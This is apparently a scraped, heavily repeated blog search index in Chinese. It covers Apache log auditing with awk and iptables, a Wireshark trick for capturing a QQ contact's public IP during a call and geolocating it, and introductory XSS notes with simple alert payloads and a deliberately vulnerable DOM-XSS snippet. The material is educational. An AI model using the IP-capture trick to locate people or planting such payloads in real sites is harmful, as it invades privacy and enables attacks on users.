~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#显示指定时间以后的日志"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#找出访问量最大的ip并封掉"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#找出下载最多的文件"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#简单统计流量"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#统计401访问拒绝的数量"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#查看某一时间内的ip连接情况"},{"categories":["web"],"content":"\r错误日志分析:默认的错误日志位置/var/log/httpd/error_log 错误日志记录了服务器运行期间遇到的各种故障，以及一些普通的诊断信息，如服务器启动/关闭的时间 日志文件记录信息级别的高低，控制日志文件记录信息的数量和类型，这是通过LogLevel指令实现的，该指令默认设置的级别是error 级别越高，记录的信息越多，日志量越大 最常见的错误日志文件有两类： 文档错误 文档错误和服务器应答中的400系列代码对应，最常见的是404错误 CGI错误 CGI程序输出到STDERR(Standard Error,标准错误设备)的所有内容都将直接进入错误日志 日志截图中画出的部分是Mozi僵尸网络的攻击payload，具体请看： https://blog.netlab.360.com/p2p-botnet-mozi/ https://cloud.tencent.com/developer/article/1708178 ","date":"2023-11-17","objectID":"/log_analysis/:1:4","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#错误日志分析"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#日志行为分析"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#检索包含关键词为hello-world的请求"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#检索包含关键词为etcpasswd的请求"},{"categories":["tricks"],"content":"WireShark监听QQ通信数据获取对方IP ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:0:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#只是一个有趣的小把戏"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#一打开wireshark对目前的网络接口进行监听"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#二在wireshark中按组合键ctrlf调出控制菜单"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#三在ip定位网站进行定位"},{"categories":["notes"],"content":"XSS基础初学笔记 ","date":"2023-11-17","objectID":"/xss/:0:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#"},{"categories":["notes"],"content":"\r0x1 简介跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS,是web中最主流的攻击方式。 XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。 XSS漏洞普遍流行的原因: Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的 输入与输出的 Web 应用程序基本交互防护不够 程序员缺乏安全意识，缺少对 XSS 漏洞的认知 XSS 触发简单，完全防御起来相当困难 XSS攻击的危害: 网络钓鱼 盗取用户 cookies 信息 劫持用户浏览器 强制弹出广告页面、刷流量 网页挂马 进行恶意操作，例如任意篡改页面信息 获取客户端隐私信息 控制受害者机器向其他网站发起攻击 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶 提升用户权限，包括进一步渗透网站 传播跨站脚本蠕虫等 ","date":"2023-11-17","objectID":"/xss/:1:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x1-简介"},{"categories":["notes"],"content":"\r0x2 跨站脚本实例下面的 HTML 代码就演示了一个最基本的 XSS 弹窗： \u003chtml\u003e \u003cbody\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2023-11-17","objectID":"/xss/:2:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x2-跨站脚本实例"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如：\u003cdiv width=$INPUT\u003e\u003c/div\u003e 将不可信数据插入到SCRIPT里时；// 例如：\u003cscript\u003evar message = ” $INPUT “;\u003c/script\u003e 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如\u003cspan style=” property : $INPUT ”\u003e\u003c/span\u003e 将不可信数据插入到HTML URL里时，// 例如：\u003ca href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”\u003e\u003c/a\u003e 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： \u003cmeta charset=\"UTF-8\"\u003e \u003cscript\u003e function xss(){ var str = document.getElementById(\"src\").value; document.getElementById(\"demo\").innerHTML = \"\u003cimg src='\"+str+\"' /\u003e\"; } \u003c/script\u003e \u003cinput type=\"text\" id=\"src\" size=\"50\" placeholder=\"输入图片地址\" /\u003e \u003cinput type=\"button\" value=\"插入\" onclick=\"xss()\" /\u003e\u003cbr\u003e \u003cdiv id=\"demo\" \u003e\u003c/div\u003e 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： \u003cimg src=\"1\" onerror=\"alert(1)\"\u003e 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x3-分类"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#1反射型xss非持久型"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 